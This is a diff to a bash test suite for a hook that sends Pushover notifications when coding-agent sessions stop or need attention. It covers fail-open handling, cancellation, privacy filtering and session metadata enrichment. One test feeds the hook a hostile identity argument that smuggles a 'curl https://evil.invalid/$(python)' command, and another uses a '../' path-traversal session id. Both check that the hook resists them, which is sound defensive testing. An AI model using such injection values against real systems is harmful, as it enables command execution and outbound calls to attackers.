@@ -18,9 +18,9 @@ run_with_state(){ local h="$1" state="$2" payload="$3"; printf '%s' "$payload" |
 wait_until(){ local deadline=$((SECONDS+5)); while [ "$SECONDS" -lt "$deadline" ]; do "$@" && return 0; sleep 0.02; done; return 1; }
 wait_count(){ [ "$(count)" = "$1" ]; }
 wait_text(){ grep -Fq -- "$1" "$LOG"; }
-# Prompt allow is unconditional; missing credentials must not create work or call sender.
-printf '%s' '{"event":"pre_user_prompt"}' | PATH="$TMP:/usr/bin:/bin" AGENT_NOTIFY_STATE_DIR="$TMP/nojq" bash "$HOOK" polytoken | grep -q 'allow' && ok "prompt always allows" || no "prompt always allows"
-printf '%s' '{"hook_event_name":"Stop","session_id":"no-creds"}' | PATH="$TMP:$PATH" AGENT_NOTIFY_STATE_DIR="$TMP/missing" AGENT_NOTIFY_DELAY=0.01 bash "$HOOK" claude
+# Prompt allow is unconditional (empty stdout = proceed); missing credentials and missing jq must not create work or call sender.
+out="$(printf '%s' '{"event":"pre_user_prompt"}' | PATH="$TMP:/usr/bin:/bin" AGENT_NOTIFY_STATE_DIR="$TMP/nojq" bash "$HOOK" polytoken)" && [ -z "$out" ] && ok "prompt allows via empty stdout" || no "prompt allows via empty stdout"
+printf '%s' '{"hook_event_name":"Stop","session_id":"no-creds"}' | PATH="$TMP:$PATH" PUSHOVER_APP_TOKEN= PUSHOVER_USER_KEY= PUSHOVER_TOKEN= PUSHOVER_USER= AGENT_NOTIFY_STATE_DIR="$TMP/missing" AGENT_NOTIFY_DELAY=0.01 bash "$HOOK" claude
 wait_until wait_count 0 && [ ! -d "$TMP/missing" ] && ok "missing credentials fail open before worker" || no "missing credentials fail open before worker"
 # Unknown/hostile harness identities fail open before state or outbound work.
 : > "$LOG"; printf '%s' '{"hook_event_name":"Stop","session_id":"hostile"}' | PATH="$TMP:$PATH" MOCK_LOG="$LOG" AGENT_NOTIFY_STATE_DIR="$TMP/hostile-state" PUSHOVER_APP_TOKEN=app PUSHOVER_USER_KEY=user bash "$HOOK" 'claude;curl https://evil.invalid/$(python);AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' >/dev/null
@@ -39,7 +39,7 @@ wait_until wait_count 1 && [ "$(grep -Fc first "$LOG" || true)" = 0 ] && grep -q
 wait_until wait_count 2 && grep -q -- '--data-urlencode title=Agent attention' "$LOG" && grep -q 'session=cross' "$LOG" && ok "cross-harness isolation and identity" || no "cross-harness isolation and identity"
 # Prompt cancellation is synchronous and prevents the delayed worker from sending.
 : > "$LOG"; AGENT_NOTIFY_DELAY_TEST=0.15 run claude '{"hook_event_name":"Stop","session_id":"cancel","message":"wait"}'
-printf '%s' '{"hook_event_name":"UserPromptSubmit","session_id":"cancel"}' | PATH="$TMP:$PATH" MOCK_LOG="$LOG" AGENT_NOTIFY_STATE_DIR="$TMP/state" PUSHOVER_APP_TOKEN=app PUSHOVER_USER_KEY=user bash "$HOOK" claude | jq -e '.outcome == "allow"' >/dev/null
+out="$(printf '%s' '{"hook_event_name":"UserPromptSubmit","session_id":"cancel"}' | PATH="$TMP:$PATH" MOCK_LOG="$LOG" AGENT_NOTIFY_STATE_DIR="$TMP/state" PUSHOVER_APP_TOKEN=app PUSHOVER_USER_KEY=user bash "$HOOK" claude)"; [ -z "$out" ] || no "cancellation prevents delivery"
 ! wait_until wait_text cancel && ok "cancellation prevents delivery" || no "cancellation prevents delivery"
 # A newer generation invalidates the old worker before send.
 : > "$LOG"; AGENT_NOTIFY_DELAY_TEST=0.5 run claude '{"hook_event_name":"Stop","session_id":"stale","message":"old"}' & p1=$!
@@ -70,6 +70,26 @@ wait_until wait_text 'agent stopped' && ok "partial lock recovery" || no "partia
 : > "$LOG"; AGENT_NOTIFY_DELAY_TEST=0.01 run claude '{"hook_event_name":"Stop","session_id":"a\u0001b","message":"x"}'; AGENT_NOTIFY_DELAY_TEST=0.01 run claude '{"hook_event_name":"Stop","session_id":"a","message":"y"}'; wait_until wait_count 2 && ok "adversarial session isolation" || no "adversarial session isolation"
 # Transcript, secret, and control text are never forwarded; only fixed category and safe metadata are sent.
 : > "$LOG"; run claude '{"hook_event_name":"Notification","session_id":"safe/../id","cwd":"/tmp/proj\u0009name","message":"TRANSCRIPT SECRET=shh \u001b[31mCONTROL","notification":"leak","reason":"also-leak"}'; wait_until wait_count 1 && ! grep -Eq 'TRANSCRIPT|SECRET=|CONTROL|leak|shh' "$LOG" && grep -q 'agent attention' "$LOG" && ok "privacy-safe fixed notification" || no "privacy-safe fixed notification"
+# The delayed worker must not hold the hook's stdout/stderr: a reader blocked on
+# EOF (how both harnesses wait) must see the hook exit well before DELAY elapses.
+: > "$LOG"; start="$SECONDS"
+AGENT_NOTIFY_DELAY_TEST=2 run claude '{"hook_event_name":"Stop","session_id":"detach","message":"sent-later"}' | cat >/dev/null
+reader_s=$((SECONDS - start))
+[ "$reader_s" -lt 2 ] && wait_until wait_count 1 && grep -q 'session=detach' "$LOG" && ok "worker stdio detached; hook returns before send (${reader_s}s)" || no "worker stdio detached; hook returns before send (${reader_s}s)"
+# Polytoken enrichment: payload has no cwd/title, so project and preview come
+# from the session files under the sessions dir.
+PSDIR="$TMP/psessions"; mkdir -p "$PSDIR/enr1"
+printf '%s' '{"project_path":"/Users/gfranks/workspace/claude-config","last_user_message_preview":"fix the stop hook timeout"}' > "$PSDIR/enr1/session.json"
+: > "$LOG"; POLYTOKEN_SESSIONS_DIR="$PSDIR" run polytoken '{"event":"stop","session_id":"enr1"}'
+wait_until wait_text 'fix the stop hook timeout' && grep -q 'project=claude-config' "$LOG" && ! grep -q 'session=enr1' "$LOG" && ok "polytoken notification carries project and preview" || no "polytoken notification carries project and preview"
+# record.json title is the fallback when session.json has no preview.
+mkdir -p "$PSDIR/enr2"; printf '%s' '{"session_title":"enr-two-title"}' > "$PSDIR/enr2/record.json"
+: > "$LOG"; POLYTOKEN_SESSIONS_DIR="$PSDIR" run polytoken '{"event":"notification","session_id":"enr2"}'
+wait_until wait_text 'enr-two-title' && grep -q 'agent attention' "$LOG" && ok "record.json title fallback" || no "record.json title fallback"
+# Slash-bearing session ids cannot escape the sessions dir when reading metadata.
+mkdir -p "$TMP/enr3"; printf '%s' '{"last_user_message_preview":"pwned"}' > "$TMP/enr3/session.json"
+: > "$LOG"; POLYTOKEN_SESSIONS_DIR="$PSDIR" run polytoken '{"event":"stop","session_id":"../enr3"}'
+! wait_until wait_text pwned && ok "session id path traversal contained" || no "session id path traversal contained"
 # Harness defaults and explicit overrides choose independent config roots.
 for h in claude polytoken; do
   base="$TMP/default-$h"; mkdir -p "$base"; : > "$LOG"
